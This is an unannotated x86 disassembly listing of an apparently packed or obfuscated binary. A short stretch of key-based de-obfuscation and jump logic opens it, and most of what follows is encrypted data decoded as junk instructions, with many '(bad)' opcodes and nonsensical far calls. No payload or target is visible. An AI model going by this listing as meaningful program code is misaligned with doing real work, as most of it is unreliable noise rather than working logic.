  408ac8:	xchg   ebx,ecx
  408aca:	dec    ecx
  408acb:	mov    eax,DWORD PTR [ebp-0x1c]
  408ace:	imul   eax,ecx
  408ad1:	sub    esp,eax
  408ad3:	mov    DWORD PTR [ebp-0x20],esp
  408ad6:	mov    eax,DWORD PTR [ebp-0x4]
  408ad9:	xor    eax,esi
  408adb:	add    eax,edi
  408add:	jmp    0x40aebb
  408ae2:	mov    ecx,DWORD PTR [ebp-0xc]
  408ae5:	mov    eax,DWORD PTR [ebp+0x8]
  408ae8:	mov    edx,DWORD PTR [ebp+0x14]
  408aeb:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  408aef:	xor    ecx,esi
  408af1:	add    ecx,edi
  408af3:	xor    edx,edx
  408af5:	div    ecx
  408af7:	mov    ecx,DWORD PTR [ebp-0x4]
  408afa:	xor    ecx,esi
  408afc:	lea    eax,[ecx+eax*1+0x3272f8]
  408b03:	mov    ecx,DWORD PTR [ebp+0x8]
  408b06:	mov    edx,DWORD PTR [ebp-0x20]
  408b09:	jmp    0x40aea9
  408b0e:	fbstp  TBYTE PTR [ebp*1-0xe9985a5]
  408b15:	cmp    cl,dh
  408b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b18:	fnstsw WORD PTR [ecx-0xb]
  408b1b:	ret    
  408b1c:	nop
  408b1d:	loop   0x408b48
  408b1f:	in     al,0x7b
  408b21:	jnp    0x408b21
  408b23:	sahf   
  408b24:	jnp    0x408ba1
  408b26:	cmc    
  408b27:	stos   DWORD PTR es:[edi],eax
  408b28:	dec    ecx
  408b29:	imul   ebx,DWORD PTR [edx],0x2a
  408b2c:	mov    al,0x30
  408b2e:	mov    BYTE PTR [edx],al
  408b30:	mov    DWORD PTR [ebx-0x49],0x5d984744
  408b37:	fstp   DWORD PTR [edx-0x6e]
  408b3a:	jecxz  0x408b82
  408b3c:	fnstenv [ebp-0x46]
  408b3f:	or     DWORD PTR [esi+esi*8-0x68932b91],esi
  408b46:	ret    
  408b47:	gs scas al,BYTE PTR es:[edi]
  408b49:	inc    edx
  408b4a:	xchg   DWORD PTR [edi-0x2efa93a],esi
  408b50:	mov    dl,0xfb
  408b52:	push   0x74
  408b54:	push   es
  408b55:	adc    dh,bh
  408b57:	outs   dx,DWORD PTR ds:[esi]
  408b58:	cmp    bl,BYTE PTR [edx-0x49]
  408b5b:	xchg   edx,eax
  408b5c:	popa   
  408b5d:	mov    ds:0x4ebd6205,al
  408b62:	dec    ebp
  408b63:	jno    0x408bb7
  408b65:	ins    BYTE PTR es:[edi],dx
  408b66:	sti    
  408b67:	add    al,0x9f
  408b69:	arpl   WORD PTR [edi+0x6b],di
  408b6c:	mov    bh,0xbb
  408b6e:	cmp    al,0x40
  408b70:	mov    dl,0xbf
  408b72:	push   ss
  408b73:	inc    eax
  408b74:	rol    BYTE PTR [edx+0x47556f2a],0xd3
  408b7b:	imul   edx,DWORD PTR [ecx],0x39
  408b7e:	pop    ss
  408b7f:	push   0x9ba12d17
  408b84:	or     ah,bl
  408b86:	mov    eax,ds:0x80b55899
  408b8b:	(bad)  
  408b8c:	sahf   
  408b8d:	(bad)  
  408b8e:	and    bh,BYTE PTR [ecx]
  408b90:	ja     0x408b2e
  408b92:	push   edi
  408b93:	pop    es
  408b94:	dec    esi
  408b95:	push   ecx
  408b96:	push   cs
  408b97:	aas    
  408b98:	dec    esp
  408b99:	push   cs
  408b9a:	or     al,0x8
  408b9c:	xchg   edi,eax
  408b9d:	popa   
  408b9e:	rol    DWORD PTR [edi+ebp*1],0xd7
  408ba2:	dec    eax
  408ba3:	xor    eax,DWORD PTR [eax]
  408ba5:	mov    ch,0xcd
  408ba7:	test   BYTE PTR [ebp-0x7ff02c15],dh
  408bad:	ins    BYTE PTR es:[edi],dx
  408bae:	jae    0x408bb3
  408bb0:	sbb    DWORD PTR [eax],esp
  408bb2:	out    0x62,eax
  408bb4:	jb     0x408b55
  408bb6:	push   0xffffffa1
  408bb8:	mov    ebx,0xbb89e510
  408bbd:	xor    ebx,edi
  408bbf:	nop
  408bc0:	test   BYTE PTR fs:[ecx],bh
  408bc3:	in     al,dx
  408bc4:	test   eax,0x462db79a
  408bc9:	cmp    eax,0xf883e73c
  408bce:	jnp    0x408bff
  408bd0:	sbb    ebx,esi
  408bd2:	push   eax
  408bd3:	add    al,0xff
  408bd5:	inc    edi
  408bd6:	stos   BYTE PTR es:[edi],al
  408bd7:	cmp    BYTE PTR [eax+0x2658be08],ch
  408bdd:	mov    ds:0x4377c1f6,eax
  408be2:	mov    WORD PTR [eax],gs
  408be4:	(bad)  
  408be5:	mov    eax,ds:0xce83fb32
  408bea:	mov    bh,0x68
  408bec:	xor    DWORD PTR [ebp-0x60],ebp
  408bef:	and    ecx,esi
  408bf1:	xchg   ecx,eax
  408bf2:	or     eax,0xbf83f2bc
  408bf7:	mov    dl,0x8d
  408bf9:	pop    ss
  408bfa:	sbb    eax,0xc983b13d
  408bff:	aas    
  408c00:	sbb    DWORD PTR [edi+ebx*8],esi
  408c03:	add    eax,0x1fa41fb8
  408c08:	sbb    BYTE PTR ds:0x54bc130f,dl
  408c0e:	int3   
  408c0f:	dec    ecx
  408c10:	pop    eax
  408c11:	loop   0x408c91
  408c13:	cli    
  408c14:	test   BYTE PTR [ebp+0x36ac9e1f],bl
  408c1a:	fist   WORD PTR [ebx]
  408c1c:	push   cs
  408c1d:	xchg   edi,eax
  408c1e:	fwait
  408c1f:	out    0x33,eax
  408c21:	mov    al,ds:0xc2a412ab
  408c26:	icebp  
  408c27:	push   0x6a3a2058
  408c2c:	dec    ecx
  408c2d:	pop    edx
  408c2e:	in     eax,dx
  408c2f:	shl    dl,1
  408c31:	ins    BYTE PTR es:[edi],dx
  408c32:	fld    TBYTE PTR [ebx-0x70]
  408c36:	sub    esp,DWORD PTR [ebx]
  408c38:	rol    DWORD PTR [edx],1
  408c3a:	jne    0x408c15
  408c3c:	ins    BYTE PTR es:[edi],dx
  408c3d:	imul   ebx,DWORD PTR [ecx+0x50],0x85a02d8
  408c44:	or     cl,BYTE PTR [edx]
  408c46:	out    dx,eax
  408c47:	jo     0x408bfd
  408c49:	gs sub bh,dl
  408c4c:	jns    0x408c8d
  408c4e:	mov    cl,0x78
  408c50:	adc    ebp,DWORD PTR [edi+0x3e]
  408c53:	enter  0x1c83,0xa1
  408c57:	ret    0xbf9a
  408c5a:	and    BYTE PTR [eax+0x4bf9bfb],0x47
  408c61:	repnz adc eax,0xfa5331df
  408c67:	pushf  
  408c68:	push   es
  408c69:	loopne 0x408ccc
  408c6b:	adc    DWORD PTR [esi-0x1c42644f],0xffffff98
  408c72:	xor    bl,BYTE PTR [edi+0x1a632786]
  408c78:	or     bl,BYTE PTR [edi]
  408c7a:	cmp    al,0xa7
  408c7c:	xchg   BYTE PTR [ecx],bl
  408c7e:	mov    ds:0x59bfc92,eax
  408c83:	(bad)  
  408c84:	pop    ebx
  408c85:	xchg   ebx,eax
  408c86:	add    bl,BYTE PTR [eax+edi*8]
  408c89:	adc    esi,DWORD PTR [ecx-0x77]
  408c8c:	pop    eax
  408c8d:	or     al,0x6d
  408c8f:	or     dl,0x81
  408c92:	pop    ecx
  408c93:	cwde   
  408c94:	mov    bl,BYTE PTR [ebx+ebx*4+0x3]
  408c98:	jle    0x408ccd
  408c9a:	imul   esi,DWORD PTR [edx-0xb],0xaeb99c4a
  408ca1:	mov    al,0xb0
  408ca3:	mov    gs,WORD PTR [edx-0x58d3c3ce]
  408ca9:	push   edi
  408caa:	push   0x63
  408cac:	pop    edx
  408cad:	cmp    eax,0xb2386a15
  408cb2:	push   eax
  408cb3:	jmp    0x408ce8
  408cb5:	mov    esp,0xacf3f84d
  408cba:	dec    ebx
  408cbb:	scas   eax,DWORD PTR es:[edi]
  408cbc:	out    0xd1,eax
  408cbe:	test   al,0x51
  408cc0:	pop    esi
  408cc1:	loop   0x408d0d
  408cc3:	or     al,0x2d
  408cc5:	jb     0x408c4b
  408cc7:	std    
  408cc8:	aas    
  408cc9:	in     al,0x41
  408ccb:	push   ss
  408ccc:	test   eax,0xa43a3bd9
  408cd1:	fdivr  QWORD PTR [edx]
  408cd3:	frstor [ecx+0x45]
  408cd6:	shl    DWORD PTR [esi],1
  408cd8:	aas    
  408cd9:	dec    ecx
  408cda:	stc    
  408cdb:	push   cs
  408cdc:	outs   dx,BYTE PTR ds:[esi]
  408cdd:	ss push eax
  408cdf:	pop    es
  408ce0:	jl     0x408d2b
  408ce2:	dec    edi
  408ce3:	xor    ebx,DWORD PTR [ecx-0x3d]
  408ce6:	imul   ebx,edx,0x6c
  408ce9:	sub    al,0xb9
  408ceb:	adc    dh,BYTE PTR [edi+ecx*8+0x3]
  408cef:	adc    BYTE PTR [edx+eiz*1],dl
  408cf2:	out    dx,al
  408cf3:	mov    eax,ds:0x1a328869
  408cf8:	pop    es
  408cf9:	or     eax,0xd78aa95b
  408cfe:	and    ch,dl
  408d00:	int    0xc3
  408d02:	adc    esp,0x538eb7c8
  408d08:	std    
  408d09:	sbb    DWORD PTR [edi-0x13],ebp
  408d0c:	xchg   ebp,eax
  408d0d:	jle    0x408d82
  408d0f:	sub    al,0xd4
  408d11:	adc    bl,BYTE PTR [ebx]
  408d13:	push   es
  408d14:	adc    eax,0x88333644
  408d19:	jg     0x408d3b
  408d1b:	(bad)  
  408d1d:	push   0x6a198d6a
  408d22:	xlat   BYTE PTR ds:[ebx]
  408d23:	popa   
  408d24:	adc    ebp,DWORD PTR [eax+0x6f]
  408d27:	dec    ecx
  408d28:	add    ebx,esi
  408d2a:	pop    es
  408d2b:	adc    BYTE PTR [ecx*1-0x5b9e8981],0xf8
  408d33:	jge    0x408d9c
  408d35:	aaa    
  408d36:	xchg   esi,eax
  408d37:	push   cs
  408d38:	xor    DWORD PTR [esi+0x6a],edx
  408d3b:	jg     0x408cfd
  408d3d:	cwde   
  408d3e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d40:	cmp    DWORD PTR [ebx],0xc020b77f
  408d46:	sub    DWORD PTR [ebx-0x4bc62558],ebp
  408d4c:	mov    edi,0x916f1f42
  408d51:	rol    DWORD PTR [edx+0x16],0x65
  408d55:	mov    bh,0x76
  408d57:	dec    eax
  408d58:	fisttp QWORD PTR ds:0x4359d850
  408d5e:	sbb    BYTE PTR [esi-0x20],bl
  408d61:	cmp    BYTE PTR [eax+0x1a],al
  408d64:	rol    eax,0xe
  408d67:	icebp  
  408d68:	(bad)  
  408d69:	retf   0xf978
  408d6c:	dec    eax
  408d6d:	push   eax
  408d6e:	xchg   ebx,eax
  408d6f:	inc    eax
  408d70:	push   ds
  408d71:	adc    al,BYTE PTR [esi+0x7f37fe15]
  408d77:	pop    esi
  408d78:	in     eax,dx
  408d79:	repz jle 0x408d5c
  408d7c:	and    eax,0xb2f781b1
  408d81:	mov    edi,0x60b45d44
  408d86:	cli    
  408d87:	cmp    dl,BYTE PTR [eax]
  408d89:	and    DWORD PTR [eax+edi*2-0x30f6b534],0xa425b327
  408d94:	scas   al,BYTE PTR es:[edi]
  408d95:	out    dx,eax
  408d96:	jecxz  0x408e08
  408d98:	xchg   DWORD PTR ds:0x1caa52fa,edx
  408d9e:	and    eax,0x9c847127
  408da3:	jl     0x408e16
  408da5:	mov    esp,0x267f2105
  408daa:	rcr    cl,1
  408dac:	sub    al,0x26
  408dae:	jns    0x408de0
  408db0:	cdq    
  408db1:	mov    edx,0xdbba365b
  408db6:	jmp    0x67cf:0x757db9c2
  408dbd:	ror    bh,1
  408dbf:	clc    
  408dc0:	mov    cl,0x50
  408dc2:	fnsave [eax-0x80]
  408dc5:	mov    esi,0x20071317
  408dca:	cmp    bh,bl
  408dcc:	jbe    0x408d50
  408dce:	xchg   ebx,eax
  408dcf:	pmaxub xmm7,XMMWORD PTR [ecx+0x2870cca4]
  408dd7:	pop    esi
  408dd8:	push   cs
  408dd9:	test   al,0xc2
  408ddb:	adc    bh,dl
  408ddd:	sti    
  408dde:	ret    0x324b
  408de1:	clc    
  408de2:	push   DWORD PTR [eax+0x26]
  408de5:	xchg   esi,eax
  408de6:	into   
  408de7:	cwde   
  408de8:	xor    al,0xb4
  408dea:	mov    ah,0x44
  408dec:	jmp    0xbd62:0x8acc72c
  408df3:	in     al,dx
  408df4:	sbb    cl,bl
  408df6:	cmp    cl,dh
  408df8:	lea    ebp,[edi]
  408dfa:	(bad)  
  408dfb:	push   ecx
  408dfc:	xchg   ebp,eax
  408dfd:	cmp    eax,0x228361b1
  408e02:	ja     0x408de4
  408e04:	sub    eax,0xe9a711d1
  408e09:	scas   al,BYTE PTR es:[edi]
  408e0a:	ds jp  0x408e42
  408e0d:	bound  esp,QWORD PTR ds:0x26bcc103
  408e13:	jno    0x408db9
  408e15:	pusha  
  408e16:	sti    
  408e17:	dec    eax
  408e18:	not    DWORD PTR [eax]
  408e1a:	cmp    dl,BYTE PTR [eax]
  408e1c:	addr16 push ebx
  408e1e:	cmp    eax,DWORD PTR [eax-0x25]
  408e21:	fcmovb st,st(7)
  408e23:	es or  eax,0xd401b4cc
  408e29:	cmp    esi,DWORD PTR [ebx-0x1399cba2]
  408e2f:	imul   ecx,DWORD PTR [esi+0x396a69ab],0x13
  408e36:	add    BYTE PTR ds:0x38556b7c,bh
  408e3c:	hlt    
  408e3d:	cmp    ch,cl
  408e3f:	jg     0x408e5b
  408e41:	jae    0x408dd5
  408e43:	ret    0x12a1
  408e46:	loope  0x408e53
  408e48:	aaa    
  408e49:	cmc    
  408e4a:	and    DWORD PTR [ecx+0x6e],0xffffffb3
  408e4e:	and    al,0x78
  408e50:	jnp    0x408df5
  408e52:	(bad)  
  408e53:	jo     0x408e34
  408e55:	ds add ebp,0xffffffa4
  408e59:	jnp    0x408e18
  408e5b:	rcl    BYTE PTR [ecx-0x45],cl
  408e5e:	fist   DWORD PTR [esi+0x76]
  408e61:	pushf  
  408e62:	aam    0x9b
  408e64:	push   es
  408e65:	shl    DWORD PTR [esp+ecx*8],0xee
  408e69:	bound  esi,QWORD PTR [eax]
  408e6b:	add    al,0x90
  408e6d:	sub    BYTE PTR [edx],dh
  408e6f:	aaa    
  408e70:	add    al,0xa
  408e72:	outs   dx,DWORD PTR ds:[esi]
  408e73:	popf   
  408e74:	fst    st(3)
  408e76:	fstp   DWORD PTR [edi]
  408e78:	mov    dh,0xb1
  408e7a:	stos   DWORD PTR es:[edi],eax
  408e7b:	inc    edx
  408e7c:	pushf  
  408e7d:	inc    edi
  408e7e:	adc    eax,0x31e3633a
  408e83:	jge    0x408e7d
  408e85:	jo     0x408e48
  408e87:	mov    esi,edi
  408e89:	bound  esp,QWORD PTR [edx]
  408e8b:	mov    ds:0x3b8edb9d,al
  408e90:	mov    al,0x47
  408e92:	or     al,0x10
  408e94:	aas    
  408e95:	xlat   BYTE PTR ds:[ebx]
  408e96:	(bad)  
  408e97:	in     eax,dx
  408e98:	xchg   ecx,eax
  408e99:	lds    eax,FWORD PTR [ebp-0x5c469de7]
  408e9f:	and    DWORD PTR [edi+0x4831ef20],0xe54972e5
  408ea9:	xlat   BYTE PTR ds:[ebx]
  408eaa:	dec    esp
  408eab:	dec    eax
  408eac:	mov    ebx,0xf3d434b4
  408eb1:	dec    edx
  408eb2:	repnz int3 
  408eb4:	pop    ecx
  408eb5:	dec    esp
  408eb6:	imul   edx,DWORD PTR [ecx],0x7215015b
  408ebc:	inc    eax
  408ebd:	leave  
  408ebe:	jl     0x408e4a
  408ec0:	ss push esi
  408ec2:	cmp    BYTE PTR [esi+0x5900f4b4],al
  408ec8:	adc    al,0x7a
  408eca:	jp     0x408e71
  408ecc:	ficom  WORD PTR [eax]
  408ece:	stos   BYTE PTR es:[edi],al
  408ecf:	out    dx,al
  408ed0:	sahf   
  408ed1:	pop    ebx
  408ed2:	adc    DWORD PTR [edi+0x594e9f39],eax
  408ed8:	push   0x4b
  408eda:	push   ebp
  408edb:	jae    0x408f35
  408edd:	int    0x13
  408edf:	outs   dx,DWORD PTR ds:[esi]
  408ee0:	pop    ds
  408ee1:	shl    edx,0x30
  408ee4:	cmp    al,0xd7
  408ee6:	scas   al,BYTE PTR es:[edi]
  408ee7:	add    eax,0x47ecd545
  408eec:	(bad)  
  408eed:	pop    ebp
  408eee:	lods   al,BYTE PTR ds:[esi]
  408eef:	pop    ds
  408ef0:	stos   DWORD PTR es:[edi],eax
  408ef1:	dec    esi
  408ef2:	rcl    bh,0x6e
  408ef5:	cmp    ch,BYTE PTR [edx-0x73]
  408ef8:	dec    ebp
  408ef9:	imul   BYTE PTR [ebp-0x7e7484ea]
  408eff:	mov    WORD PTR gs:[ecx+0x75],?
  408f03:	clc    
  408f04:	lea    ecx,[eax]
  408f06:	inc    esp
  408f08:	jne    0x408eaf
  408f0a:	inc    edx
  408f0b:	cdq    
  408f0c:	(bad)  
  408f0e:	dec    esp
  408f0f:	call   0xc12c5c55
  408f14:	(bad)  
  408f16:	daa    
  408f17:	push   cs
  408f18:	or     eax,0x60a30b27
  408f1d:	test   eax,0xf39acf26
  408f22:	and    ebp,DWORD PTR [esi]
  408f24:	pop    ds
  408f25:	iret   
  408f26:	aam    0xc7
  408f28:	cmc    
  408f29:	js     0x408ed0
  408f2b:	mov    dh,0xca
  408f2d:	xor    esi,ecx
  408f2f:	into   
  408f30:	or     bh,BYTE PTR [ebp-0x141a299]
  408f36:	ins    DWORD PTR es:[edi],dx
  408f37:	pop    eax
  408f38:	pop    ss
  408f39:	adc    bh,BYTE PTR [ecx-0x12]
  408f3c:	push   eax
  408f3d:	mov    ecx,0xcfe9ab20
  408f42:	lds    esp,FWORD PTR [esi]
  408f44:	iret   
  408f45:	daa    
  408f46:	pop    esi
  408f47:	push   ecx
  408f48:	cmp    eax,0xeefbc8a8
  408f4d:	push   esi
  408f4e:	dec    edi
  408f4f:	push   ecx
  408f50:	mov    ?,WORD PTR [esi+0x34]
  408f53:	push   edx
  408f54:	imul   esi,ebx,0xffffffde
  408f57:	xor    eax,DWORD PTR [esi-0x22]
  408f5a:	rol    DWORD PTR ds:0xed1d6010,0xd6
  408f61:	lods   eax,DWORD PTR ds:[esi]
  408f62:	call   0x6b3a:0xf750e08d
  408f69:	dec    edx
  408f6a:	out    0x4a,eax
  408f6c:	add    DWORD PTR [ebp-0x1ec56c68],esi
  408f72:	rol    dl,cl
  408f74:	(bad)  [ebx]
  408f76:	scas   al,BYTE PTR es:[edi]
  408f77:	or     esp,ebp
  408f79:	or     esi,ebp
  408f7b:	pop    esp
  408f7c:	(bad)  
  408f7d:	(bad)  
  408f7e:	fucomp st(7)
  408f80:	adc    esp,0xde96954c
  408f86:	cmp    al,0xa5
  408f88:	mov    ds:0x1249eddc,al
  408f8d:	push   ebp
  408f8e:	jae    0x408f36
  408f90:	sbb    DWORD PTR [ecx-0x1969f687],0x1b
  408f97:	adc    dh,BYTE PTR [esp+edx*2]
  408f9a:	repnz bnd ret 
  408f9d:	cmp    al,0x1d
  408f9f:	cmp    al,0x38
  408fa1:	mov    DWORD PTR [edx+0x44],ebp
  408fa4:	call   0x5a7b:0xaa7f56c4
  408fab:	das    
  408fac:	call   0x46b07
  408fb1:	adc    BYTE PTR [edx],ch
  408fb3:	popa   
  408fb4:	adc    dh,BYTE PTR ss:[ebx+0x67ab929c]
  408fbb:	mov    dh,al
  408fbd:	fdivr  DWORD PTR [esi-0x79794367]
  408fc3:	(bad)  
  408fc5:	add    ah,BYTE PTR [esi-0x3fdb5033]
  408fcb:	fadd   DWORD PTR [eax-0x1dbf9075]
  408fd1:	add    esp,DWORD PTR [ecx]
  408fd3:	rol    cl,cl
  408fd5:	(bad)  
  408fd6:	aad    0x7d
  408fd8:	and    bl,bh
  408fda:	add    bl,BYTE PTR [edi]
  408fdc:	xchg   DWORD PTR gs:[ebx],esp
  408fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fe0:	adc    DWORD PTR [edi+0x7f],ebp
  408fe3:	pop    edx
  408fe4:	in     eax,dx
  408fe5:	mov    dl,0x56
  408fe7:	cs ins BYTE PTR es:[edi],dx
  408fe9:	repz or ah,BYTE PTR [eax+0x79]
  408fed:	push   cs
  408fee:	out    dx,al
  408fef:	mov    ds:0xb8395285,eax
  408ff4:	fistp  DWORD PTR [ecx+0x48ec94fa]
  408ffa:	push   ebx
  408ffb:	lahf   
  408ffc:	int3   
  408ffd:	jg     0x409042
  408fff:	gs repz pusha 
  409002:	ss ins DWORD PTR es:[edi],dx
  409004:	adc    esp,DWORD PTR [eax]
  409006:	push   ebx
  409007:	fwait
  409008:	mov    bh,0x57
  40900a:	or     al,0x6
  40900c:	pop    ebx
  40900d:	(bad)  
  40900e:	js     0x408fb4
  409010:	cmp    bh,BYTE PTR [eax+0x7fada73b]
  409016:	fst    QWORD PTR [esi+edx*4]
  409019:	je     0x408faf
  40901b:	and    esp,DWORD PTR [ecx+0x4ee445e1]
  409021:	invd   
  409023:	adc    eax,esp
  409025:	loopne 0x409075
  409027:	add    DWORD PTR [ebp+0x67b90637],edi
  40902d:	stc    
  40902e:	int    0xbf
  409030:	mov    ch,0x17
  409032:	pop    eax
  409033:	ror    DWORD PTR [ebx-0x5fc7d652],1
  409039:	repnz inc ebp
  40903b:	test   ch,dl
  40903d:	jle    0x4090aa
  40903f:	repnz inc ebx
  409041:	(bad)  
  409042:	mov    edx,edx
  409044:	dec    esi
  409045:	and    DWORD PTR [edi],eax
  409047:	lds    esp,FWORD PTR [ecx+0x5488754]
  40904d:	cmp    DWORD PTR [edi+0x2182e4c9],eax
  409053:	addr16 mov dl,0x27
  409056:	imul   esi,DWORD PTR [ebx+0x9],0x1b
  40905a:	mov    esi,0x9c71b648
  40905f:	test   al,0x19
  409061:	mov    cl,0x66
  409063:	mov    BYTE PTR [esi+edi*4+0x73],dh
  409067:	imul   ebx,ebx,0xffffffa0
  40906a:	hlt    
  40906b:	fwait
  40906c:	ds push esp
  40906e:	mov    bh,0x90
  409070:	xchg   esp,eax
  409071:	mov    esp,0x3cbb1fc
  409076:	(bad)  
  409077:	lock mov bh,0xf7
  40907a:	sbb    al,0xc7
  40907c:	cwde   
  40907d:	out    0x49,al
  40907f:	(bad)  
  409080:	je     0x40909e
  409082:	xor    al,0x1d
  409084:	outs   dx,DWORD PTR ds:[esi]
  409085:	dec    ebp
  409086:	and    dh,BYTE PTR [ebx+edi*2+0x6255a9c0]
  40908d:	push   0xee8eb86c
  409092:	xor    DWORD PTR [ebx],0xc3c11a1a
  409098:	jle    0x4090cc
  40909a:	in     al,0xe6
  40909c:	mov    ds:0xc387a8f9,eax
  4090a1:	mov    BYTE PTR ds:0x52a8cdb4,dh
  4090a7:	sub    DWORD PTR [edx],0xffffffe0
  4090aa:	push   0x3c
  4090ac:	adc    DWORD PTR [eax],0x4e
  4090af:	test   al,0xc2
  4090b1:	icebp  
  4090b2:	(bad)  [edx-0xe]
  4090b5:	push   eax
  4090b6:	les    esp,FWORD PTR ds:0xee609d8c
  4090bc:	sub    bl,BYTE PTR [ebx-0x57]
  4090bf:	retf   0x2fb8
  4090c2:	xchg   BYTE PTR [edx],al
  4090c4:	in     al,dx
  4090c5:	xchg   esp,eax
  4090c6:	lock test eax,0xe06a5261
  4090cc:	fst    DWORD PTR [esi+ecx*2+0x61]
  4090d0:	rcr    DWORD PTR [ebx],1
  4090d2:	retf   
  4090d3:	or     DWORD PTR [esi],eax
  4090d5:	xchg   BYTE PTR [ebx+0x60],bl
  4090d8:	in     al,0x3
  4090da:	cmp    DWORD PTR [eax-0x32],ebp
  4090dd:	sub    al,0x45
  4090df:	mov    al,ds:0x24fd8cd3
  4090e4:	je     0x4090d3
  4090e6:	das    
  4090e7:	or     al,BYTE PTR [esi]
  4090e9:	test   DWORD PTR [esi],esp
  4090eb:	(bad)  
  4090ec:	rol    BYTE PTR [eax],1
  4090ee:	inc    esp
  4090ef:	jge    0x4090da
  4090f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090f2:	leave  
  4090f3:	jmp    0x40911a
  4090f5:	sub    ecx,DWORD PTR [ebx-0x24b660cb]
  4090fb:	add    dh,BYTE PTR [edx]
  4090fd:	jo     0x4090d6
  4090ff:	in     eax,dx
  409100:	fimul  DWORD PTR [esi+0x119d8104]
  409106:	pop    eax
  409107:	cmp    ebp,edx
  409109:	scas   eax,DWORD PTR es:[edi]
  40910a:	aam    0xa7
  40910c:	push   edi
  40910d:	add    BYTE PTR ss:[edx-0x1cfd9287],dl
  409114:	ins    DWORD PTR es:[edi],dx
  409115:	into   
  409116:	adc    al,0x66
  409118:	lods   eax,DWORD PTR ds:[esi]
  409119:	test   DWORD PTR [ebp-0x1af937b],edi
  40911f:	push   es
  409120:	mov    esi,0x43c6946d
  409125:	jmp    0x4090c8
  409127:	and    DWORD PTR [eax+0x464e5e6e],esi
  40912d:	pop    edx
  40912e:	cli    
  40912f:	pop    eax
  409130:	add    esp,DWORD PTR [eax+0x7527c367]
  409136:	dec    ecx
  409137:	dec    edi
  409138:	jne    0x4090fe
  40913a:	pop    ebx
  40913b:	jp     0x4091a4
  40913d:	int3   
  40913e:	jg     0x409194
  409140:	mov    bh,0x62
  409142:	push   eax
  409143:	out    0x87,eax
  409145:	daa    
  409146:	jecxz  0x4091b6
  409148:	xor    eax,0x797d752f
  40914d:	mov    edi,0x5e0e8282
  409152:	iret   
  409153:	sti    
  409154:	cmp    bh,BYTE PTR [esi+0x41a14b51]
  40915a:	int3   
  40915b:	fwait
  40915c:	sbb    al,0x41
  40915e:	add    ebp,DWORD PTR [eax+0x387bb528]
  409164:	outs   dx,BYTE PTR ds:[esi]
  409165:	xor    al,0x2e
  409167:	jb     0x40915d
  409169:	and    DWORD PTR fs:[ecx-0x585b6acf],edi
  409170:	xchg   edx,eax
  409171:	mov    ecx,0xcd49e6b
  409176:	push   ebx
  409177:	jo     0x409185
  409179:	lods   al,BYTE PTR ds:[esi]
  40917a:	rcl    dl,1
  40917c:	inc    ebp
  40917d:	push   es
  40917e:	(bad)  
  40917f:	and    edx,DWORD PTR [edx+0x4d]
  409182:	lds    edx,FWORD PTR [ebx-0xee25793]
  409188:	jno    0x4091c9
  40918a:	pop    esi
  40918b:	les    edx,FWORD PTR [esp+ecx*8]
  40918e:	ins    BYTE PTR es:[edi],dx
  40918f:	fldcw  WORD PTR [ebp+edi*8+0x25]
  409193:	mov    bh,0xb9
  409195:	call   0x59049ce
  40919a:	stc    
  40919b:	ss scas eax,DWORD PTR es:[edi]
  40919d:	and    al,0xef
  40919f:	jp     0x409142
  4091a1:	popf   
  4091a2:	mov    eax,ds:0x14f457c5
  4091a7:	icebp  
  4091a8:	push   ds
  4091a9:	js     0x4091fb
  4091ab:	imul   ebx,DWORD PTR [ebp+ebx*8-0x8ffe450],0x4cd0c93
  4091b6:	and    al,0xc8
  4091b8:	pop    ecx
  4091b9:	pop    ss
  4091ba:	mov    bl,BYTE PTR [edx+ecx*4-0x2a]
  4091be:	in     eax,0x26
  4091c0:	add    BYTE PTR [edx-0x5b],bl
  4091c3:	sub    eax,0x3d2f8fc5
  4091c8:	ficomp WORD PTR [edx-0x675453cb]
  4091ce:	mov    ebx,DWORD PTR [esi+0x52c0f441]
  4091d4:	jne    0x409180
  4091d6:	jecxz  0x40922e
  4091d8:	mov    db2,eax
  4091db:	mov    esi,0x7710729e
  4091e0:	pushf  
  4091e1:	call   0x4151a98a
  4091e6:	ret    
  4091e7:	add    ecx,ecx
  4091e9:	aad    0xcd
  4091eb:	or     eax,DWORD PTR [ebx+0x10f225a3]
  4091f1:	or     eax,0x238577bd
  4091f6:	fsub   st,st(5)
  4091f8:	(bad)  
  4091f9:	cmp    eax,0x54eff242
  4091fe:	mov    esp,0x794e7e4b
  409203:	push   ebp
  409204:	sub    dl,BYTE PTR [esp+edi*8-0x5e49159e]
  40920b:	dec    esp
  40920c:	sbb    al,0xf2
  40920e:	inc    esi
  40920f:	xor    esi,DWORD PTR [edi+0x57326d15]
  409215:	test   BYTE PTR [eax-0x57],bl
  409218:	lods   al,BYTE PTR ds:[esi]
  409219:	xor    DWORD PTR [ebp-0x46],0x57
  40921d:	push   edx
  40921e:	mov    al,ds:0xe3b78eb9
  409223:	pop    esi
  409224:	xor    eax,0xb4aa0d07
  409229:	nop
  40922a:	xor    BYTE PTR [edx+edi*4],bh
  40922d:	add    BYTE PTR [ecx],dh
  40922f:	and    esp,0x4a
  409232:	push   es
  409233:	ret    
  409234:	add    edi,edx
  409236:	shl    DWORD PTR gs:[ebx+0x5e],0xd6
  40923b:	cmp    bh,BYTE PTR [eax+0x51]
  40923e:	shl    ah,cl
  409240:	adc    al,0xbc
  409242:	or     BYTE PTR [edx+0x22],dl
  409245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409246:	pop    esp
  409247:	pop    ebp
  409248:	hlt    
  409249:	(bad)  
  40924a:	in     al,0x70
  40924c:	jb     0x4091da
  40924e:	retf   0x8008
  409251:	popa   
  409252:	fdiv   DWORD PTR [edi]
  409254:	push   esi
  409255:	hlt    
  409256:	jne    0x4092a3
  409258:	mov    ecx,DWORD PTR [eax]
  40925a:	es pop edi
  40925c:	fild   QWORD PTR [ebp+0x6a]
  40925f:	sbb    DWORD PTR [esi],esi
  409261:	daa    
  409262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409263:	ds jle 0x4091fa
  409266:	xchg   BYTE PTR [ebx],dl
  409268:	repnz sub DWORD PTR [edx-0x6e23ac50],eax
  40926f:	xchg   ebp,eax
  409270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409271:	mov    DWORD PTR [edx],edi
  409273:	and    eax,0xe09abd97
  409278:	out    0xbf,al
  40927a:	fucomi st,st(2)
